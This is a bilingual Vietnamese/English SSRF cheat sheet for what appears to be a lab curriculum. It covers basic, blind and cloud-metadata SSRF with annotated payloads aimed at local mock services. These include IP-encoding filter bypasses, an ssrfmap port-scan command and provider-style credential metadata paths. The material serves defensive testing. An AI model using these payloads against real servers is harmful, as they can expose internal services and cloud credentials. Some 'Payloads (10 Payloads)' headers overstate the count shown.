# 3. Server-Side Request Forgery (SSRF)

> [!CAUTION]
> Chỉ dùng trong lab local hoặc hệ thống có ủy quyền rõ ràng. Payload có risk `destructive`, `dos` hoặc `oob` phải chạy trong fixture cô lập, có giới hạn tài nguyên và không có outbound network.

> **Phạm vi kiểm chứng:** Nội dung và payload vẫn ở mức technical review. `static-verified` chỉ xác nhận annotation và kiểm tra tĩnh trong đúng context/version đã ghi; không phải lab evidence và không cho phép sử dụng ngoài phạm vi được ủy quyền.

Server-Side Request Forgery (SSRF) xảy ra khi máy chủ bị lừa gửi yêu cầu HTTP/HTTPS đến một địa chỉ IP hoặc miền tùy ý (thường là các máy chủ cục bộ hoặc dịch vụ nội bộ đằng sau tường lửa).

### 3.1. Basic SSRF (SSRF cơ bản - có phản hồi dữ liệu)

*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Xảy ra khi ứng dụng gửi yêu cầu HTTP phía máy chủ (Server-side HTTP request) dựa trên URL do người dùng cung cấp và trả lại toàn bộ hoặc một phần dữ liệu phản hồi đó cho người dùng (ví dụ: chức năng tải ảnh từ link, chuyển đổi định dạng tài liệu).
    *   *English*: Basic SSRF occurs when the server fetches a user-provided URL and displays the response content, headers, or structure back to the user.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Nhập địa chỉ cục bộ (`http://127.0.0.1` hoặc `http://localhost`) hoặc các cổng nội hạt (`http://127.0.0.1:22`, `http://127.0.0.1:6379`). Nếu nhận lời chào SSH Banner, lỗi Redis, hoặc giao diện quản trị nội bộ hiển thị trên màn hình, lỗ hổng tồn tại.
    *   *English*: Inject local loopback addresses (`http://127.0.0.1`, `http://localhost`) or internal ports (`http://127.0.0.1:22`, `http://127.0.0.1:6379`) to check for internal services and raw responses.
*   **Payloads (10 Payloads)**:
<!-- payload-id: CHEAT-03-001 -->
<!-- context: URL input fetched by a local HTTP client fixture; loopback-only mock services -->
<!-- prerequisites: fixture network namespace contains only mock services on 127.0.0.1; no outbound route -->
<!-- encoding: URL strings exactly as shown; resolver behavior for alternate IP forms must be recorded -->
<!-- expected-result: vulnerable fixture reaches only the documented mock port; hardened fixture rejects loopback after canonicalization -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```txt
    # 1. Basic local loopback test.
    http://127.0.0.1:80

    # 2. Alternate local mock port.
    http://localhost:18080

    # 3. IPv6 loopback bypass.
    http://[::1]:18080

    # 4. Reserved test name mapped to loopback inside the fixture only.
    http://loopback.lab.test:18080

    # 5. Decimal representation of IP 127.0.0.1.
    http://2130706433

    # 6. Hexadecimal representation of IP 127.0.0.1.
    http://0x7f000001

    # 7. Octal representation of IP 127.0.0.1.
    http://0177.0000.0000.0001

    # 8. Shortened IP representation.
    http://127.1

    # 9. Reserved test callback name mapped by the local fixture DNS.
    http://callback.lab.test:18080

    # 10. Scheme allowlist negative case; the hardened fixture must reject it.
    dict://127.0.0.1:18080/info
    ```
*   **Tool tự động**:
    *   *Tiếng Việt*: Sử dụng ssrfmap để kiểm thử tự động các cổng nội bộ trên các tham số có phản hồi.
    *   *English*: Use ssrfmap to automatically test internal ports on parameters that return data.
<!-- payload-id: CHEAT-03-002 -->
<!-- context: Python 3.12 and requests 2.32 fetcher in a network namespace; mock HTTP, DNS and metadata services listen only on 127.0.0.1:18080-18082; case: 3.1. Basic SSRF (SSRF cơ bản - có phản hồi dữ liệu) -->
<!-- prerequisites: block all egress except the mock network, reset redirect/DNS state between cases and confirm destination access only from mock logs -->
<!-- encoding: UTF-8 Bash source with POSIX shell quoting preserved; .lab.test names resolve to loopback and the named tool constructs HTTP/DNS framing -->
<!-- expected-result: only the intentionally vulnerable fetcher reaches the loopback internal marker; the fixed fetcher blocks the destination before connection and logs the denial -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    # Fuzz internal ports using ssrfmap in standard request files
    python ssrfmap.py -r req.txt -p url -m portscan
    ```

---


### 3.2. Blind SSRF (SSRF mù - không phản hồi dữ liệu)

*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Khi máy chủ thực hiện yêu cầu đến URL cung cấp nhưng không trả lại bất cứ dữ liệu nào trên giao diện. Trạng thái lỗi hay thành công chỉ được phát hiện qua hành vi mạng (Network Behavior) hoặc độ trễ phản hồi HTTP (Timing differences).
    *   *English*: Blind SSRF exists when the server issues the web request but hides the response content. Verification must be performed using out-of-band monitoring or timing checks.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Trong curriculum này, callback phải trỏ tới mock listener trong cùng network namespace. Xác nhận bằng correlation ID trong log của mock; không dùng Burp Collaborator, Interactsh hoặc callback Internet.
    *   *English*: This curriculum uses only a mock listener in the same local network namespace. Correlate the fixture request with the mock log; do not use an Internet callback service.
*   **Payloads (10 Payloads)**:
<!-- payload-id: CHEAT-03-003 -->
<!-- context: URL input with a mock HTTP callback bound to 127.0.0.1:18081 -->
<!-- prerequisites: callback is local, tagged probe-42 and outbound network is disabled -->
<!-- encoding: URL path is ASCII; no DNS lookup is required -->
<!-- expected-result: mock listener records one GET /callback/probe-42 with the fixture correlation ID -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```txt
    # Positive probe handled by the local mock listener.
    http://127.0.0.1:18081/callback/probe-42

    # IPv6 loopback variant when the fixture binds IPv6 explicitly.
    http://[::1]:18081/callback/probe-42

    # Reserved fixture name; local DNS must map it to the mock only.
    http://callback.lab.test:18081/callback/probe-42
    ```
*   **Tool tự động**:
    *   *Tiếng Việt*: Khởi chạy mock callback local, lưu access log và đối chiếu correlation ID từ ứng dụng fixture.
    *   *English*: Start a local mock callback, retain its access log, and correlate it with the application fixture.
<!-- payload-id: CHEAT-03-004 -->
<!-- context: Python 3 local HTTP mock bound to loopback -->
<!-- prerequisites: port 18081 is free; command runs only inside the isolated fixture namespace -->
<!-- encoding: HTTP served by Python standard library; access log is written to stderr -->
<!-- expected-result: requesting /callback/probe-42 produces a local access-log entry; no Internet DNS/HTTP occurs -->
<!-- risk: oob -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    # Start a loopback-only callback mock inside the disposable fixture
    python3 -m http.server 18081 --bind 127.0.0.1
    ```

---

### 3.3. Cloud Metadata SSRF (SSRF khai thác Metadata dịch vụ đám mây)

*   **Nhận biết / Dấu hiệu**:
    *   *Tiếng Việt*: Trên hạ tầng đám mây, workload có thể truy cập metadata service qua địa chỉ dành riêng của provider. SSRF có thể làm lộ metadata hoặc credential nếu provider/runtime policy không yêu cầu cơ chế bảo vệ bổ sung.
    *   *English*: In cloud environments, workloads may reach a provider metadata service at a reserved address. SSRF can expose metadata or credentials when provider and runtime protections are insufficient.
*   **Nghi ngờ / Kiểm tra**:
    *   *Tiếng Việt*: Chỉ dùng mock metadata endpoint local có dữ liệu giả. Các đường dẫn provider bên dưới mô phỏng semantics để kiểm tra allowlist/egress policy, không trỏ tới IP metadata thật.
    *   *English*: Use only a local metadata mock with fake data. The provider-style paths below emulate semantics for allowlist and egress-policy tests; they do not target a real metadata IP.
*   **Payloads (10 Payloads)**:
<!-- payload-id: CHEAT-03-005 -->
<!-- context: provider-style paths served by mock metadata at 127.0.0.1:18082 -->
<!-- prerequisites: mock returns fake identifiers only; link-local metadata routes are absent; outbound network is disabled -->
<!-- encoding: URL query strings are UTF-8/ASCII and generated exactly as shown -->
<!-- expected-result: vulnerable fixture reaches the mock and returns fake marker data; hardened fixture rejects the destination before connect -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```txt
    # AWS-style fake role-name path.
    http://127.0.0.1:18082/latest/meta-data/iam/security-credentials/

    # GCP-style fake token path; mock verifies the required header separately.
    http://127.0.0.1:18082/computeMetadata/v1/instance/service-accounts/default/token

    # Azure-style fake instance path; mock verifies Metadata: true separately.
    http://127.0.0.1:18082/metadata/instance?api-version=2021-02-01
    ```
*   **Tool tự động**:
    *   *Tiếng Việt*: Dùng client fixture gọi mock metadata local và xác nhận destination policy chặn trước khi kết nối.
    *   *English*: Use the fixture client against the local metadata mock and verify that destination policy blocks before connect.
<!-- payload-id: CHEAT-03-006 -->
<!-- context: curl against local metadata mock health endpoint -->
<!-- prerequisites: mock is bound to 127.0.0.1:18082 and returns no credential-shaped fields -->
<!-- encoding: HTTP/1.1 generated by curl; no provider link-local address -->
<!-- expected-result: health endpoint returns the literal marker SECHUB_METADATA_MOCK -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
    ```bash
    # Verify that the local metadata mock is ready before the SSRF regression test
    curl --fail --max-time 2 http://127.0.0.1:18082/health
    ```

---

## Tài liệu tham khảo

- **[S1]** OWASP SSRF Prevention Cheat Sheet. https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html — bản hiện hành; truy cập: 2026-07-18.
